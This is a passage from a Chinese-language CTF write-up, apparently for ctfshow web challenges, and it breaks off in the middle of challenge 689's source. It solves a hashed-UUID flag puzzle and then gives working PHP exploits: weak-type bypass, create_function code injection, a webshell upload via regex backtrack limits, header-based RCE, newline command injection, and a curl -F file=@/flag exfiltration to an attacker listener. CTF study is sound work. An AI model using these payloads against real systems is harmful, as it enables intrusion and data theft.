            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
                n<span class="token operator">++</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> <span class="token number">191</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">&lt;</span> <span class="token number">224</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                c2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                n <span class="token operator">+=</span> <span class="token number">2</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                c2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                c3 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> c3 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                n <span class="token operator">+=</span> <span class="token number">3</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> t
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">function</span> <span class="token function">st3</span><span class="token punctuation">(</span><span class="token parameter">srcString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>srcString<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> <span class="token constant">BASE32CHAR</span> <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> digit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> currByte<span class="token punctuation">;</span>
    <span class="token keyword">let</span> nextByte<span class="token punctuation">;</span>
    <span class="token keyword">let</span> retrunString <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    srcString <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_encode</span><span class="token punctuation">(</span>srcString<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> srcString<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        currByte <span class="token operator">=</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token operator">:</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> srcString<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                nextByte <span class="token operator">=</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>
                    <span class="token operator">?</span> srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
                    <span class="token operator">:</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                nextByte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            digit <span class="token operator">=</span> currByte <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0xFF</span> <span class="token operator">>></span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>
            index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">;</span>
            digit <span class="token operator">&lt;&lt;=</span> index<span class="token punctuation">;</span>
            digit <span class="token operator">|=</span> <span class="token punctuation">(</span>nextByte <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            i<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            digit <span class="token operator">=</span> <span class="token punctuation">(</span>currByte <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">;</span>
            index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                i<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        retrunString <span class="token operator">=</span> retrunString <span class="token operator">+</span> <span class="token constant">BASE32CHAR</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>digit<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>retrunString<span class="token punctuation">.</span>length <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        retrunString <span class="token operator">+=</span> <span class="token string">"="</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> retrunString<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åˆ†æä»£ç ï¼Œè¦æ±‚flagç¬¦åˆä¸‹åˆ—æ¡ä»¶</p>
<ol>
<li>å‰å…«ä½ä¸ºå­—ç¬¦ä¸²<code>ctfshow&#123;</code>ï¼Œç»“å°¾ä¸º<code>&#125;</code></li>
<li>flagç»è¿‡sha256è¿ç®—çš„ç»“æœä¸º<code>e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d</code></li>
<li>ä¸­é—´å†…å®¹é•¿åº¦ä¸º36ï¼Œæœ‰4ä¸ªUUIDåˆ†å—<code>-</code></li>
<li>c2nå‡½æ•°çš„ä½œç”¨ï¼šå°†UUIDä¸­çš„å†…å®¹è½¬æ¢ä¸º10è¿›åˆ¶æ•°</li>
<li>s2n2suå‡½æ•°çš„ä½œç”¨ï¼šå°†UUIDä¸­æ¯ä¸€ä½çš„æ•°å­—ç›¸åŠ å¹¶è¿”å›æœ€ç»ˆçš„å€¼</li>
<li>ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µçš„UUIDå’Œå€¼ä¸º63</li>
<li>ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µçš„å‰å››ä½ç»è¿‡sha256è¿ç®—åçš„ç»“æœæ˜¯<code>c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400</code>ï¼Œç»“æœä¸º<code>592b</code></li>
<li>ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µå4ä½ç»è¿‡sha256è¿ç®—åçš„ç»“æœæ˜¯<code>f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc</code>ï¼Œç»“æœä¸º<code>9d77</code></li>
<li>ç¬¬äºŒä¸ªUUIDåˆ†æ®µæ˜¯<code>9dda</code></li>
<li>ç¬¬ä¸‰ä¸ªUUIDçš„ç¬¬äºŒä½æ˜¯eï¼Œå¹¶ä¸”å‰©ä½™ä¸‰ä½çš„è¿æ¥åä¸º430</li>
<li>ç¬¬å››ä¸ªUUIDä¸º<code>94a4</code></li>
<li>ç¬¬äº”ä¸ªUUIDç»è¿‡base32ç¼–ç ç»“æœä¸º<code>GVSTMNDGGQ2DSOLBGUZA====</code></li>
</ol>
<p>æœ€ç»ˆæ„é€ å‡ºflag</p>
<pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;592b9d77-9dda-4e30-94a4-5e64f4499a52&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é¡ºä¾¿è´´ä¸ªçˆ†ç ´è„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> <span class="token operator">*</span>
string<span class="token operator">=</span><span class="token string">"0123456789abcdef"</span>
k<span class="token operator">=</span>product<span class="token punctuation">(</span>string<span class="token punctuation">,</span>repeat<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> k<span class="token punctuation">:</span>
    aaa<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    out1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>aaa<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>out1<span class="token operator">==</span><span class="token string">'c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>out1<span class="token operator">==</span><span class="token string">'f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>683</strong></p>
<p>æ˜æ˜¾çš„å¼±ç±»å‹æ¯”è¾ƒ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
   <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span> 
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å¿…é¡»æ˜¯æ•°å­—'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
       <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä½ å¤ªçŸ­äº†'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
       <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä½ å¤ªé•¿äº†'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
       <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> 
           <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> 
       <span class="token punctuation">&#125;</span> 
   <span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è‡ªåŠ¨è½¬æ¢æ—¶xexä¼šè¢«è½¬æ¢ä¸ºåŸå§‹æ•°å­—ï¼Œintå¼ºåˆ¶è½¬æ¢stringæ—¶å–åˆ°å­—æ¯åœæ­¢</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?ç§€&#x3D;0.6e7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>684</strong></p>
<p>æºç åœ¨æ­¤</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å˜é‡$actionè¦å‡ºç°æ•°å­—å­—æ¯ä»¥å¤–çš„å­—ç¬¦ï¼Œè¿˜è¦æ‰§è¡Œå‡½æ•°ï¼Œä½¿ç”¨\create_functionï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯phpç¯å¢ƒä¸­é»˜è®¤çš„namespace</p>
<blockquote>
<p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚ æ¥ä¸‹æ¥ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥å¼•å‘å±é™©çš„å‡½æ•°ã€‚</p>
</blockquote>
<blockquote>
<p>create_function()æ˜¯PHPä¸­çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºåœ¨PHPä¸­åˆ›å»ºåŒ¿å(lambda-style)å‡½æ•°ã€‚</p>
<p><strong>ç”¨æ³•:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">string create_function ( $args, $code )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>å‚æ•°ï¼š</strong>è¯¥å‡½æ•°æ¥å—ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°ï¼š</p>
<ul>
<li>**$args:**å®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å‡½æ•°å‚æ•°ã€‚</li>
<li>**$code:**å®ƒæ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å‡½æ•°ä»£ç ã€‚</li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong>é€šå¸¸ï¼Œè¿™äº›å‚æ•°å°†ä½œä¸ºå•å¼•å·åˆ†éš”çš„å­—ç¬¦ä¸²ä¼ é€’ã€‚ä½¿ç”¨å•å¼•å·å¼•èµ·æ¥çš„å­—ç¬¦ä¸²çš„åŸå› æ˜¯ä¸ºäº†é˜²æ­¢å˜é‡åè¢«è§£æï¼Œå¦åˆ™ï¼Œå°†éœ€è¦åŒå¼•å·æ¥è½¬ä¹‰å˜é‡åï¼Œä¾‹å¦‚\ $avarã€‚</p>
<p><strong>è¿”å›å€¼ï¼š</strong>æ­¤å‡½æ•°ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›å”¯ä¸€çš„å‡½æ•°åç§°ï¼Œå¦åˆ™ï¼Œåœ¨é”™è¯¯æ—¶è¿”å›FALSEã€‚</p>
</blockquote>
<p>è€Œå¯¹äºcreate_functionå‡½æ•°æ¥è¯´ï¼Œå®é™…æ‰§è¡Œçš„å†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">function noname($args) &#123; $code &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç»“å°¾æˆ‘ä»¬ä½¿ç”¨}é—­åˆï¼Œæœ€ç»ˆçš„payloadå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?action&#x3D;%5ccreate_function&amp;arg&#x3D;&#125;system(&#39;tac &#x2F;secret_you_never_know&#39;);&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>685</strong></p>
<p>åˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡</p>
<blockquote>
<p>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit<br>å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼äº†ã€‚</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">"http://b826efef-6cde-4fa8-84d3-4cb699605ab2.challenge.ctf.show"</span>
files<span class="token operator">=</span><span class="token punctuation">&#123;</span>
	<span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">1000000</span>
<span class="token punctuation">&#125;</span>
r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>686</strong></p>
<p>æ— å‚RCE</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?code&#x3D;system(current(getallheaders()));
X-Forwarded-Host: cat &#x2F;secret_you_never_know<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>687</strong></p>
<p>æ¢è¡Œæ‰§è¡Œå‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?ip&#x3D;1%0atac &#x2F;flaaag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>688</strong></p>
<p>ä¿©å‡½æ•°ä¸€èµ·ç”¨æœ‰çš„é—®é¢˜</p>
<p><code>escapeshellarg(); escapeshellcmd();</code></p>
<pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;http:&#x2F;&#x2F;ç›‘å¬ä½¿ç”¨çš„ip:port&#x2F;&#39; -F file&#x3D;@&#x2F;flag&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å®é™…ä¼ å…¥shellçš„æ˜¯</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> <span class="token string">'http://IP:ç«¯å£/'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">' -F file=@/flag'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç›´æ¥å¸¦å‡ºæ–‡ä»¶</p>
<p><strong>689</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

